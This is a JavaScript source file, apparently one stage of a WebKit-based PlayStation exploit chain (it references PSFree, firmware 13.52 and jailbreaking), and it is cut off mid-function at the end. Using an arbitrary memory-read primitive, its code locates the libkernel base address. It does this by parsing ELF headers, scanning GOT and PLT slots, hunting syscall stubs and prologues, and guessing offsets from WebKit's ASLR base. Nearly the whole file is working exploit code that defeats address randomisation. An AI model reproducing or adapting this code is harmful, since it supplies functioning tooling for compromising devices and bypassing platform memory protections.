/** 2-read probe of estimateLibkernelCandidates — logs OOM vs prologue vs other. */
export function probeLibkernelGuesses(p, webkitBase, nativeFn, log) {
    log = log || (() => {});
    const cands = estimateLibkernelCandidates(webkitBase, nativeFn);
    const out = [];
    for (let i = 0; i < cands.length; i++) {
        const c = cands[i];
        let addr;
        try {
            addr = parseAddrSync(c.hex.replace(/^0x/i, ""));
        } catch (_) {
            addr = null;
        }
        if (!addr) {
            out.push({ hex: c.hex, why: c.why, status: "bad-hex" });
            continue;
        }
        const w0 = read4p(p, addr);
        const w1 = read4p(p, addr.add32(4));
        if (w0 == null) {
            log("LK-PROBE-GUESS", c.hex + " UNREAD (" + c.why + ")");
            out.push({ hex: c.hex, why: c.why, status: "unread" });
            continue;
        }
        const prologue = (w0 & 0xff) === 0xb8 && w1 != null && (w1 & 0xffff) === 0x050f;
        if (prologue && isLibkernelPrologue(p, addr)) {
            saveLibkernelSession(addr, null);
            log("LK-PROBE-OK", c.hex + " prologue HIT (" + c.why + ")");
            out.push({ hex: c.hex, why: c.why, status: "hit", lk: addr });
            return { ok: true, lk: addr, why: c.why, tried: out };
        }
        log("LK-PROBE-GUESS", c.hex + " w0=" + fmtMagic(w0)
            + (w1 != null ? " w1=" + fmtMagic(w1) : " w1=null")
            + " (" + c.why + ")");
        out.push({ hex: c.hex, why: c.why, status: "miss", w0, w1 });
    }
    return { ok: false, tried: out };
}

/** Guess bases from webkit ASLR — try paste or ring probe. */
export function estimateLibkernelCandidates(webkitBase, nativeFn) {
    const out = [];
    if (!webkitBase) return out;
    const wb = ptrBig(webkitBase);
    const aligned = wb & ~0x3fffn;
    const deltas = [
        0x800000, 0x1000000, 0x2000000, 0x4000000, 0x8000000, 0xc000000,
    ];
    for (let i = 0; i < deltas.length; i++) {
        const d = BigInt(deltas[i]);
        out.push({ hex: "0x" + (aligned - d).toString(16), why: "wk-" + deltas[i].toString(16) });
        out.push({ hex: "0x" + (aligned + d).toString(16), why: "wk+" + deltas[i].toString(16) });
    }
    if (nativeFn) {
        const na = ptrBig(nativeFn) & ~0x3fffn;
        out.push({ hex: "0x" + (na - 0x1000000n).toString(16), why: "nativeFn-16MB" });
        out.push({ hex: "0x" + (na + 0x1000000n).toString(16), why: "nativeFn+16MB" });
    }
    return out;
}

/** Try estimateLibkernelCandidates prologues (2 reads each). */
function scanGuessCandidatesChunk(p, webkitBase, nativeFn, sub) {
    if (!sub) {
        const cands = estimateLibkernelCandidates(webkitBase, nativeFn);
        if (!cands.length)
            return { done: true, lk: null, state: null, phase: "guess-skip" };
        sub = { cands, idx: 0 };
        return { done: false, state: sub, phase: "guess-start", total: cands.length };
    }

    let batch = 0;
    while (sub.idx < sub.cands.length && batch < 4) {
        const c = sub.cands[sub.idx++];
        batch++;
        let addr;
        try {
            addr = parseAddrSync(c.hex.replace(/^0x/i, ""));
        } catch (_) {
            addr = null;
        }
        if (!addr) continue;
        if (isLibkernelPrologue(p, addr)) {
            saveLibkernelSession(addr, null);
            return {
                done: true,
                lk: addr,
                iatRva: null,
                source: "guess/" + c.why,
                state: sub,
                phase: "guess-hit",
                tried: sub.idx,
            };
        }
    }

    if (sub.idx >= sub.cands.length)
        return { done: true, lk: null, state: sub, phase: "guess-miss", tried: sub.cands.length };
    return { done: false, state: sub, phase: "guess", tried: sub.idx, total: sub.cands.length };
}

/** Paste libkernel base OR any code pointer inside libkernel. */
export function verifyManualLibkernelFromPtr(p, raw, off) {
    const ptr = typeof raw === "string" ? parseAddrSync(raw) : raw;
    if (!ptr) return { ok: false, error: "bad address" };
    if (isLibkernelPrologue(p, ptr)) {
        saveLibkernelSession(ptr, null);
        return { ok: true, lk: ptr, via: "prologue@paste" };
    }
    const hit = lkFromFnPtr(p, ptr, off, null);
    if (hit) {
        saveLibkernelSession(hit.lk, hit.iatRva);
        return { ok: true, lk: hit.lk, via: hit.via };
    }
    const walked = findModuleBaseBackward(p, ptr, 512);
    if (walked && looksLikeLibkernelModule(p, walked)) {
        saveLibkernelSession(walked, null);
        return { ok: true, lk: walked, via: "walk-back" };
    }
    return { ok: false, error: "not libkernel" };
}

/** Scan mapped RW/data within cap for external code pointers → libkernel walk-back. */
function scanMappedExtPtrChunk(p, webkitBase, off, state) {
    if (!state) {
        const base = moduleLoadBase(p, webkitBase);
        const ranges = elfMappedGotRanges(p, webkitBase, off);
        if (!ranges.length)
            ranges.push(...syntheticRwRanges(off));
        state = {
            loadBase: base,
            ranges,
            rangeIdx: 0,
            cursor: ranges[0].lo,
            endRva: ranges[0].hi,
            tried: 0,
        };
        return {
            done: false,
            state,
            phase: "rwptr-start",
            ranges: ranges.length,
        };
    }

    let batch = 0;
    while (state.cursor < state.endRva && batch < 8) {
        const rva = state.cursor;
        state.cursor += 8;
        state.tried++;
        batch++;
        const fnPtr = read8p(p, state.loadBase.add32(rva));
        if (!fnPtr || !plausibleExtPtr(fnPtr, state.loadBase, off)) continue;
        const hit = lkFromFnPtr(p, fnPtr, off, rva);
        if (hit) {
            saveLibkernelSession(hit.lk, hit.iatRva);
            return {
                done: true,
                lk: hit.lk,
                iatRva: hit.iatRva,
                source: "rwptr+" + rva.toString(16) + "/" + hit.via,
                state,
                phase: "rwptr-hit",
                tried: state.tried,
            };
        }
        const walked = findModuleBaseBackward(p, fnPtr, 512);
        if (walked && looksLikeLibkernelModule(p, walked)) {
            saveLibkernelSession(walked, rva);
            return {
                done: true,
                lk: walked,
                iatRva: rva,
                source: "rwptr-walk+" + rva.toString(16),
                state,
                phase: "rwptr-hit",
                tried: state.tried,
            };
        }
    }

    if (state.cursor >= state.endRva) {
        const next = state.rangeIdx + 1;
        if (next < state.ranges.length) {
            state.rangeIdx = next;
            state.cursor = state.ranges[next].lo;
            state.endRva = state.ranges[next].hi;
            return {
                done: false,
                state,
                phase: "rwptr-region",
                region: state.ranges[next].tag,
                cursor: state.cursor,
                tried: state.tried,
            };
        }
        return {
            done: true,
            lk: null,
            state,
            phase: "rwptr-miss",
            tried: state.tried,
        };
    }

    return {
        done: false,
        state,
        phase: "rwptr",
        cursor: state.cursor,
        tried: state.tried,
    };
}

/** Direct libkernel base hunt — page-aligned mov eax;syscall prologue. */
function scanLkPrologueChunk(p, off, sub, anchors, radius) {
    const RADIUS = radius != null ? radius : LK_HUNT_RADIUS;
    const STEP = 0x4000n;

    if (!anchors || !anchors.length)
        return { done: true, lk: null, state: sub, phase: "base-skip" };

    if (!sub) {
        sub = scanAnchorsInit({}, anchors, RADIUS, STEP);
        return {
            done: false,
            state: sub,
            phase: "base-start",
            anchor: 0,
            from: sub.cursor.toString(16),
            to: sub.end.toString(16),
        };
    }

    let batch = 0;
    while (sub.cursor <= sub.end && batch < 8) {
        const addr = bigToPtr(sub.cursor);
        if (addr.hi >= 0x8 && lkAligned(addr)) {
            sub.probes++;
            if (isLibkernelPrologue(p, addr)) {
                saveLibkernelSession(addr, null);
                return {
                    done: true,
                    lk: addr,
                    iatRva: null,
                    source: "prologue",
                    state: sub,
                    phase: "base-hit",
                };
            }
        }
        sub.cursor += sub.step;
        batch++;
    }

    if (sub.cursor > sub.end) {
        if (scanAnchorsAdvance(sub, RADIUS)) {
            return {
                done: false,
                state: sub,
                phase: "base-anchor",
                anchor: sub.anchorIdx,
                from: sub.cursor.toString(16),
                to: sub.end.toString(16),
            };
        }
        return { done: true, lk: null, state: sub, phase: "base-miss", probes: sub.probes };
    }

    return {
        done: false,
        state: sub,
        phase: "base",
        at: sub.cursor.toString(16),
        probes: sub.probes,
        anchor: sub.anchorIdx,
    };
}

function isMovRaxImmStart(p, addr) {
    const w = read4p(p, addr);
    return w != null && (w & 0xffffff) === 0xc0c748;
}

/** Sparse getpid stub hunter ±128MB from anchor(s), 4KB steps. */
function scanLibkernelStubChunk(p, webkitBase, off, sub, anchors, radius) {
    if (!anchors || !anchors.length) {
        return { done: true, lk: null, state: sub, phase: "stub-skip" };
    }

    const RADIUS = radius != null ? radius : LK_HUNT_RADIUS;
    const STEP = 0x1000n;

    if (!sub) {
        sub = scanAnchorsInit({}, anchors, RADIUS, STEP);
        return {
            done: false,
            state: sub,
            phase: "stub-start",
            anchor: 0,
            from: sub.cursor.toString(16),
            to: sub.end.toString(16),
        };
    }

    let batch = 0;
    while (sub.cursor <= sub.end && batch < 8) {
        const addr = bigToPtr(sub.cursor);
        if (addr.hi >= 0x8) {
            sub.probes++;
            if (isMovRaxImmStart(p, addr)) {
                const v = read8p(p, addr);
                if (isGetpidStub(v) || isSyscallStub(v, 20)) {
                    const hit = lkFromStubAddr(p, addr, off);
                    if (hit) {
                        saveLibkernelSession(hit.lk, null);
                        return {
                            done: true,
                            lk: hit.lk,
                            iatRva: null,
                            source: "stub-near",
                            stubAt: String(addr),
                            stubOff: hit.stubOff,
                            state: sub,
                            phase: "stub-hit",
                        };
                    }
                }
            }
        }
        sub.cursor += sub.step;
        batch++;
    }

    if (sub.cursor > sub.end) {
        if (scanAnchorsAdvance(sub, RADIUS)) {
            return {
                done: false,
                state: sub,
                phase: "stub-anchor",
                anchor: sub.anchorIdx,
                from: sub.cursor.toString(16),
                to: sub.end.toString(16),
            };
        }
        return { done: true, lk: null, state: sub, phase: "stub-miss", probes: sub.probes };
    }

    return {
        done: false,
        state: sub,
        phase: "stub",
        at: sub.cursor.toString(16),
        probes: sub.probes,
        anchor: sub.anchorIdx,
    };
}

function syntheticTextRanges(off) {
    return [{ lo: 0x1000, hi: LK_LOW_TEXT_MAX, tag: "tx-low" }];
}

function syntheticRwRanges(off) {
    return [{ lo: 0x80000, hi: 0x80000 + 0x20000, tag: "rw-lite" }];
}

/** PT_LOAD readable non-exec within cap — RELRO .got + writable data. */
export function elfMappedGotRanges(p, webkitBase, off) {
    const cap = iatCap(off);
    const layout = resolveModuleLayout(p, webkitBase, { quick: true });
    const img = layout && layout.img;
    if (!img) {
        if (layout && layout.poops) return syntheticRwRanges(off);
        return [];
    }
    if (read2p(p, img.add32(0x12)) !== 0x3e) return [];

    const ePhoff = u64Lo(read8p(p, img.add32(0x20)));
    const ePhnum = read2p(p, img.add32(0x38));
    const ePhentsize = read2p(p, img.add32(0x36));
    if (ePhoff == null || !ePhnum || !ePhentsize) return [];

    const ranges = [];
    for (let i = 0; i < ePhnum; i++) {
        const ph = ePhoff + i * ePhentsize;
        const pType = read4p(p, img.add32(ph));
        if (pType !== PT_LOAD) continue;
        const pFlags = read4p(p, img.add32(ph + 4));
        if ((pFlags & PF_R) === 0) continue;
        if ((pFlags & PF_X) !== 0) continue;

        const wVaddr = read8p(p, img.add32(ph + 0x10));
        const wMemsz = read8p(p, img.add32(ph + 0x28));
        if (!wVaddr || !wMemsz) continue;

        const lo = Number(u64FromRead8(wVaddr) & 0xffffffffn);
        let hi = lo + Number(u64FromRead8(wMemsz) & 0xffffffffn);
        if (lo >= cap) continue;
        if (hi > cap) hi = cap;
        if (lo + 0x1000 >= hi) continue;
        const tag = (pFlags & PF_W) ? "rw" : "ro";
        ranges.push({ lo: lo & ~7, hi, tag: tag + i });
    }
    ranges.sort((a, b) => a.lo - b.lo);
    return ranges;
}

/** @deprecated alias */
export function elfMappedRwRanges(p, webkitBase, off) {
    return elfMappedGotRanges(p, webkitBase, off);
}

/** Executable PT_LOAD spans within mapped cap (or low .text for poops). */
export function elfMappedTextRanges(p, webkitBase, off) {
    const cap = iatCap(off);
    const layout = resolveModuleLayout(p, webkitBase, { quick: true });
    const img = layout && layout.img;
    if (!img) {
        if (layout && (layout.poops || layout.kind === "text"))
            return syntheticTextRanges(off);
        return [];
    }
    if (read2p(p, img.add32(0x12)) !== 0x3e) return [];

    const ePhoff = u64Lo(read8p(p, img.add32(0x20)));
    const ePhnum = read2p(p, img.add32(0x38));
    const ePhentsize = read2p(p, img.add32(0x36));
    if (ePhoff == null || !ePhnum || !ePhentsize) return [];

    const ranges = [];
    for (let i = 0; i < ePhnum; i++) {
        const ph = ePhoff + i * ePhentsize;
        const pType = read4p(p, img.add32(ph));
        if (pType !== PT_LOAD) continue;
        const pFlags = read4p(p, img.add32(ph + 4));
        if ((pFlags & PF_X) === 0) continue;

        const wVaddr = read8p(p, img.add32(ph + 0x10));
        const wMemsz = read8p(p, img.add32(ph + 0x28));
        if (!wVaddr || !wMemsz) continue;

        const lo = Number(u64FromRead8(wVaddr) & 0xffffffffn);
        let hi = lo + Number(u64FromRead8(wMemsz) & 0xffffffffn);
        if (lo >= cap) continue;
        if (hi > cap) hi = cap;
        if (lo + 0x1000 >= hi) continue;
        ranges.push({ lo: lo & ~3, hi, tag: "tx" + i });
    }
    ranges.sort((a, b) => a.lo - b.lo);
    return ranges;
}

function rvaInRwRanges(rva, ranges) {
    for (let i = 0; i < ranges.length; i++) {
        if (rva >= ranges[i].lo && rva < ranges[i].hi) return true;
    }
    return false;
}

function iatHitReturn(state, hit, source) {
    saveLibkernelSession(hit.lk, hit.iatRva);
    state.done = true;
    return {
        done: true,
        lk: hit.lk,
        iatRva: hit.iatRva,
        source: source + (hit.via ? "/" + hit.via : ""),
        state,
    };
}

function beginGotScan(state, ranges) {
    state.phase = "got";
    state.gotRanges = ranges;
    state.rangeIdx = 0;
    state.cursor = ranges[0].lo;
    state.endRva = ranges[0].hi;
    state.slots = 0;
}

/**
 * Chunked GOT scan — ELF readable non-exec segments (RELRO + writable).
 */
export function scanErrorIatChunk(p, webkitBase, off, state) {
    if (!state) {
        state = { phase: "ranges", done: false };
    }

    if (state.phase === "ranges") {
        const ranges = elfMappedGotRanges(p, webkitBase, off);
        if (!ranges.length) {
            state.done = true;
            return { done: true, lk: null, state, phase: "no-got" };
        }
        beginGotScan(state, ranges);
        return {
            done: false,
            state,
            phase: "got-start",
            ranges: ranges.map(r => "+0x" + r.lo.toString(16)
                + "…+0x" + r.hi.toString(16) + "(" + r.tag + ")").join(" "),
        };
    }

    if (state.phase === "got" || state.phase === "rw") {
        const ranges = state.gotRanges || state.rwRanges;
        let steps = 0;
        while (state.cursor < state.endRva && steps < 24) {
            if (rvaInRwRanges(state.cursor, ranges)) {
                state.slots++;
                const hit = safeVerifyGotSlot(p, webkitBase, off, state.cursor);
                if (hit)
                    return iatHitReturn(state, hit, "got");
            }
            state.cursor += 8;
            steps++;
        }

        if (state.cursor >= state.endRva) {
            const next = (state.rangeIdx || 0) + 1;
            if (next < ranges.length) {
                state.rangeIdx = next;
                state.cursor = ranges[next].lo;
                state.endRva = ranges[next].hi;
                return {
                    done: false,
                    state,
                    phase: "got-region",
                    region: ranges[next].tag,
                    cursor: state.cursor,
                    end: state.endRva,
                };
            }
            state.done = true;
            return { done: true, lk: null, state, phase: "got-miss", slots: state.slots };
        }

        return {
            done: false,
            state,
            phase: "got",
            cursor: state.cursor,
            end: state.endRva,
            slots: state.slots,
            region: ranges[state.rangeIdx].tag,
        };
    }

    state.done = true;
    return { done: true, lk: null, state };
}

/**
 * Parse webkit PT_DYNAMIC, compute GOT RVAs, resolve libkernel — no binary/dump.
 */
export function resolveLibkernelDynamic(p, webkitBase, off, opts) {
    opts = opts || {};
    const log = opts.log || (() => {});
    const cap = iatCap(off);
    const diag = diagnoseWebkitDynamic(p, webkitBase, off, { deep: false });
    if (diag.reason !== "ok") {
        log("LK-DYN", diag.reason + (diag.poops ? " poops=1" : "") + " cap=" + diag.cap);
        return { ok: false, error: diag.reason, diag };
    }
    const meta = parseDynamicMeta(p, webkitBase);
    const slots = splitSlotsByCap(collectDynamicGotRvas(p, meta, null), cap);
    log("LK-DYN", "inCap " + slots.length + "/" + diag.total
        + " jmprel=" + diag.jmprel + " pltgot=" + diag.pltgot + " cap=" + diag.cap);
    for (let i = 0; i < slots.length; i++) {
        const hit = safeVerifyGotSlot(p, webkitBase, off, slots[i]);
        if (hit) {
            saveLibkernelSession(hit.lk, hit.iatRva);
            log("LK-DYN-OK", "got+0x" + slots[i].toString(16) + " → " + hit.lk
                + " (" + hit.via + ")");
            return {
                ok: true,
                lk: hit.lk,
                iatRva: hit.iatRva,
                source: "dyn-got+" + slots[i].toString(16),
            };
        }
    }
    return { ok: false, error: "dynamic GOT inCap miss", slots: slots.length, diag };
}

function dynDetail(p, webkitBase, off) {
    return diagnoseWebkitDynamic(p, webkitBase, off);
}

function scanDynamicGotChunk(p, webkitBase, off, state) {
    if (!state) {
        const cap = iatCap(off);
        const detail = dynDetail(p, webkitBase, off);
        const meta = parseDynamicMeta(p, webkitBase);
        if (!meta) {
            return {
                done: true,
                lk: null,
                state: null,
                phase: "dyn-bad",
                detail,
            };
        }
        const all = collectDynamicGotRvas(p, meta, null);
        const slots = splitSlotsByCap(all, cap);
        if (!slots.length) {
            return {
                done: true,
                lk: null,
                state: null,
                phase: "dyn-empty",
                detail,
                jmprel: meta.jmprel,
                pltgot: meta.pltgot,
                total: all.length,
                inCap: 0,
            };
        }
        state = {
            slots,
            idx: 0,
            tried: 0,
            total: all.length,
            meta: {
                jmprel: meta.jmprel,
                pltgot: meta.pltgot,
                count: slots.length,
            },
        };
        return {
            done: false,
            state,
            phase: "dyn-start",
            slots: slots.length,
            total: all.length,
            jmprel: meta.jmprel,
            pltgot: meta.pltgot,
            detail,
        };
    }

    let batch = 0;
    while (state.idx < state.slots.length && batch < 16) {
        const rva = state.slots[state.idx++];
        state.tried++;
        const hit = safeVerifyGotSlot(p, webkitBase, off, rva);
        if (hit) {
            saveLibkernelSession(hit.lk, hit.iatRva);
            return {
                done: true,
                lk: hit.lk,
                iatRva: hit.iatRva,
                source: "dyn-got+" + rva.toString(16) + "/" + hit.via,
                state,
                phase: "dyn-hit",
                tried: state.tried,
            };
        }
        batch++;
    }

    if (state.idx >= state.slots.length) {
        return {
            done: true,
            lk: null,
            state,
            phase: "dyn-miss",
            tried: state.tried,
            slots: state.slots.length,
        };
    }

    return {
        done: false,
        state,
        phase: "dyn",
        idx: state.idx,
        total: state.slots.length,
        tried: state.tried,
    };
}

/**
 * PSFree method: __stack_chk_fail PLT in low .text → resolve_import → find_base.
 * Does NOT touch wk___imp___error @ +0x3cb8cc8 (unmapped on 13.52).
 */
export function resolveLibkernelPsfree(p, webkitBase, off, opts) {
    opts = opts || {};
    const log = opts.log || (() => {});
    const cap = iatCap(off);

    for (let i = 0; i < IMPORT_PLT_CANDS.length; i++) {
        const pltRva = IMPORT_PLT_CANDS[i];
        if (pltRva >= cap) continue;
        const fn = resolvePltImportAt(p, webkitBase, pltRva);
        if (!fn) continue;
        const hit = lkFromFnPtr(p, fn, off, null);
        if (hit) {
            saveLibkernelSession(hit.lk, hit.iatRva);
            log("LK-PSFREE", "plt+0x" + pltRva.toString(16) + " → " + hit.lk
                + " (" + hit.via + ")");
            return {
                ok: true,
                lk: hit.lk,
                iatRva: hit.iatRva,
                source: "psfree+" + pltRva.toString(16),
                pltRva,
            };
        }
    }
    return { ok: false, error: "no low PLT import matched libkernel ELF" };
}

/**
 * Dump-free: scan ±512MB for ELF modules, pick highest syscall-stub density.
 * No static offsets — works without webkit dump or jailbreak.
 */
function scanElfModulesChunk(p, webkitBase, off, sub, anchors) {
    const RADIUS = LK_ELF_RADIUS;
    const STEP = 0x4000n;
    const MIN_SCORE = 8;

    if (!anchors || !anchors.length)
        return { done: true, lk: null, state: sub, phase: "elf-skip" };

    if (!sub) {
        sub = scanAnchorsInit({}, anchors, RADIUS, STEP);
        sub.phase = "scan";
        sub.seen = {};
        sub.queue = [];
        sub.qIdx = 0;
        sub.best = null;
        sub.pages = 0;
        sub.modules = 0;
        return {
            done: false,
            state: sub,
            phase: "elf-start",
            anchor: 0,
            from: sub.cursor.toString(16),
            to: sub.end.toString(16),
        };
    }

    if (sub.phase === "scan") {
        let batch = 0;
        while (sub.cursor <= sub.end && batch < 8) {
            const addr = bigToPtr(sub.cursor);
            if (addr.hi >= 0x8) {
                sub.pages++;
                const magic = read4p(p, addr);
                if (magic != null && isModuleMagic(magic)) {
                    const key = ptrBig(addr).toString(16);
                    if (!sub.seen[key] && !isSameWebkitModule(addr, webkitBase, off)) {
                        sub.seen[key] = 1;
                        sub.queue.push(addr);
                        sub.modules++;
                    }
                }
            }
            sub.cursor += sub.step;
            batch++;
        }

        if (sub.cursor > sub.end) {
            if (scanAnchorsAdvance(sub, RADIUS)) {
                return {
                    done: false,
                    state: sub,
                    phase: "elf-anchor",
                    anchor: sub.anchorIdx,
                    modules: sub.modules,
                };
            }
            sub.phase = "score";
            sub.qIdx = 0;
            if (!sub.queue.length) {
                return {
                    done: true,
                    lk: null,
                    state: sub,
                    phase: "elf-miss",
                    pages: sub.pages,
                    modules: 0,
                };
            }
        } else {
            return {
                done: false,
                state: sub,
                phase: "elf",
                at: sub.cursor.toString(16),
                pages: sub.pages,
                modules: sub.modules,
                anchor: sub.anchorIdx,
            };
        }
    }

    if (sub.phase === "score") {
        let batch = 0;
        while (sub.qIdx < sub.queue.length && batch < 2) {
            const base = sub.queue[sub.qIdx++];
            const sc = scoreModuleAsLibkernel(p, base);
            if (!sub.best || sc.score > sub.best.score)
                sub.best = { base, stubs: sc.stubs, prologue: sc.prologue, score: sc.score };
            batch++;
        }

        if (sub.qIdx < sub.queue.length) {
            return {
                done: false,
                state: sub,
                phase: "elf-score",
                scored: sub.qIdx,
                total: sub.queue.length,
                best: sub.best,
            };
        }

        if (sub.best && sub.best.score >= MIN_SCORE) {
            saveLibkernelSession(sub.best.base, null);
            return {
                done: true,
                lk: sub.best.base,
                iatRva: null,
                source: "elf-hunt",
                state: sub,
                phase: "elf-hit",
                stubs: sub.best.stubs,
                prologue: sub.best.prologue,
                pages: sub.pages,
                modules: sub.modules,
            };
        }

        return {
            done: true,
            lk: null,
            state: sub,
            phase: "elf-miss",
            pages: sub.pages,
            modules: sub.modules,
            bestScore: sub.best ? sub.best.score : 0,
        };
    }

    return { done: true, lk: null, state: sub, phase: "elf-miss" };
}

export function resolveLibkernelElfHunt(p, webkitBase, off, opts) {
    opts = opts || {};
    const log = opts.log || (() => {});
    const anchors = [webkitBase];
    if (opts.nativeFn) {
        const nb = ptrBig(opts.nativeFn);
        const wb = ptrBig(webkitBase);
        if (nb !== wb) anchors.push(opts.nativeFn);
    }

    let sub = null;
    let ticks = 0;
    while (ticks++ < 50000) {
        const c = scanElfModulesChunk(p, webkitBase, off, sub, anchors);
        sub = c.state;
        if (c.done && c.lk) {
            log("LK-ELF", "base=" + c.lk + " stubs=" + c.stubs
                + (c.prologue ? " prologue" : ""));
            return { ok: true, lk: c.lk, source: c.source };
        }
        if (c.done) break;
    }
    return { ok: false, error: "no libkernel ELF near webkit" };
}

/** Chunked scan of low .text for ff 25 PLT stubs → libkernel base. */
function scanPsfreePltChunk(p, webkitBase, off, state) {
    const TEXT_CAP = LK_LOW_TEXT_MAX;

    if (!state) {
        const base = moduleLoadBase(p, webkitBase);
        const textRanges = elfMappedTextRanges(p, webkitBase, off);
        if (!textRanges.length)
            return { done: true, lk: null, state: null, phase: "psfree-skip" };
        state = {
            base,
            textRanges,
            rangeIdx: 0,
            cursor: textRanges[0].lo,
            endRva: Math.min(textRanges[0].hi, TEXT_CAP),
            seen: {},
            tried: 0,
        };
        return { done: false, state, phase: "psfree-start" };
    }

    let batch = 0;
    while (state.cursor < state.endRva && batch < 32) {
        const rva = state.cursor;
        if (read2p(p, state.base.add32(rva)) === 0x25ff
            || read2p(p, state.base.add32(rva)) === 0x15ff) {
            const key = rva.toString(16);
            if (!state.seen[key]) {
                state.seen[key] = 1;
                state.tried++;
                const fn = resolvePltImportAt(p, webkitBase, rva);
                if (fn) {
                    const hit = lkFromFnPtr(p, fn, off, null);
                    if (hit) {
                        saveLibkernelSession(hit.lk, hit.iatRva);
                        return {
                            done: true,
                            lk: hit.lk,
                            iatRva: hit.iatRva,
                            source: "psfree-scan+" + rva.toString(16),
                            state,
                            phase: "psfree-hit",
                            tried: state.tried,
                        };
                    }
                }
            }
        }
        state.cursor += 4;
        batch++;
    }

    if (state.cursor >= state.endRva) {
        const next = state.rangeIdx + 1;
        if (next < state.textRanges.length) {
            state.rangeIdx = next;
            state.cursor = state.textRanges[next].lo;
            state.endRva = Math.min(state.textRanges[next].hi, TEXT_CAP);
            return {
                done: false,
                state,
                phase: "psfree-region",
                cursor: state.cursor,
            };
        }
        return { done: true, lk: null, state, phase: "psfree-miss", tried: state.tried };
    }

    return {
        done: false,
        state,
        phase: "psfree",
        cursor: state.cursor,
        tried: state.tried,
    };
}

/**
 * ELF module hunt → PSFree PLT → GOT → prologue → stub.
 */
export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
    opts = opts || {};
    if (!state) {
        const layout = resolveModuleLayout(p, webkitBase, { quick: true });
        const w0 = read4p(p, webkitBase);
        const forcePoops = w0 === POOPS_TEXT_MAGIC;
        const poopsLite = forcePoops || !!(layout && layout.poops && !layout.img);
        state = {
            stage: poopsLite ? "psfree" : "dyn",
            poopsLite,
            sub: null,
            gotSlots: 0,
            pltRefs: 0,
            done: false,
            anchors: null,
            psfreeTried: false,
        };
        if (poopsLite) {
            return {
                done: false,
                state,
                phase: "lite-start",
                poopsLite: true,
            };
        }
    }

    if (!state.anchors) {
        state.anchors = [webkitBase];
        if (opts.nativeFn) {
            const nb = ptrBig(opts.nativeFn);
            const wb = ptrBig(webkitBase);
            if (nb !== wb) state.anchors.push(opts.nativeFn);
        }
    }

    if (state.stage === "dyn") {
        const c = scanDynamicGotChunk(p, webkitBase, off, state.sub);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            state.stage = "rwptr";
            state.sub = null;
            state.dynTried = c.tried || 0;
            state.dynSlots = c.slots || c.inCap || 0;
            state.dynTotal = c.total || 0;
            state.dynDetail = c.detail;
            state.dynPrev = c.phase;
            return {
                done: false,
                state,
                phase: "dyn-done",
                prev: c.phase,
                dynSlots: c.slots || c.inCap || 0,
                dynTotal: c.total || 0,
                dynTried: c.tried || 0,
                detail: c.detail,
                jmprel: c.jmprel,
                pltgot: c.pltgot,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "rwptr") {
        const c = scanMappedExtPtrChunk(p, webkitBase, off, state.sub);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            state.stage = "elf";
            state.sub = null;
            return {
                done: false,
                state,
                phase: "elf-next",
                prev: c.phase,
                rwptrTried: c.tried,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "elf") {
        const c = scanElfModulesChunk(p, webkitBase, off, state.sub, state.anchors);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            state.stage = "psfree";
            state.sub = null;
            return {
                done: false,
                state,
                phase: "psfree-next",
                prev: c.phase,
                pages: c.pages,
                modules: c.modules,
                bestScore: c.bestScore,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "psfree") {
        if (!state.psfreeTried) {
            state.psfreeTried = true;
            const fast = resolveLibkernelPsfree(p, webkitBase, off, opts);
            if (fast.ok) {
                return {
                    done: true,
                    lk: fast.lk,
                    iatRva: fast.iatRva,
                    source: fast.source,
                    state,
                    phase: "psfree-hit",
                };
            }
        }
        const c = scanPsfreePltChunk(p, webkitBase, off, state.sub);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            state.stage = "plt";
            state.sub = null;
            return {
                done: false,
                state,
                phase: "plt-next",
                prev: c.phase,
                tried: c.tried,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "plt") {
        const c = scanPltGotChunk(p, webkitBase, off, state.sub);
        state.sub = c.state;
        if (c.refs != null) state.pltRefs = c.refs;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            if (state.poopsLite) {
                state.stage = "nearlk";
                state.sub = null;
                state.pltStats = {
                    refs: state.pltRefs,
                    ff25: c.ff25,
                    gotHigh: c.gotHigh,
                    e8ext: c.e8ext,
                };
                return {
                    done: false,
                    state,
                    phase: "nearlk-next",
                    ff25: c.ff25,
                    gotHigh: c.gotHigh,
                    e8ext: c.e8ext,
                    refs: c.refs,
                };
            }
            state.stage = "got";
            state.sub = null;
            return {
                done: false,
                state,
                phase: "got-next",
                prev: c.phase,
                refs: state.pltRefs,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "nearlk") {
        const c = scanNearLibkernelChunk(p, webkitBase, off, state.sub, state.anchors);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            const st = state.pltStats || {};
            state.stage = "ring";
            state.sub = null;
            state.pltStats = st;
            return {
                done: false,
                state,
                phase: "ring-next",
                nearPages: c.pages,
                nearHits: c.hits,
                ff25: st.ff25,
                gotHigh: st.gotHigh,
                e8ext: st.e8ext,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "ring") {
        const c = scanLkPrologueRingChunk(p, off, state.sub, state.anchors);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            state.stage = "leak";
            state.sub = null;
            state.ringProbes = c.probes;
            return {
                done: false,
                state,
                phase: "leak-next",
                ringProbes: c.probes,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "leak") {
        const c = scanLeakExtPtrChunk(p, webkitBase, off, state.sub, opts.retain);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            state.stage = "guess";
            state.sub = null;
            state.leakTried = c.tried;
            return {
                done: false,
                state,
                phase: "guess-next",
                leakTried: c.tried,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "guess") {
        const c = scanGuessCandidatesChunk(p, webkitBase, opts.nativeFn, state.sub);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
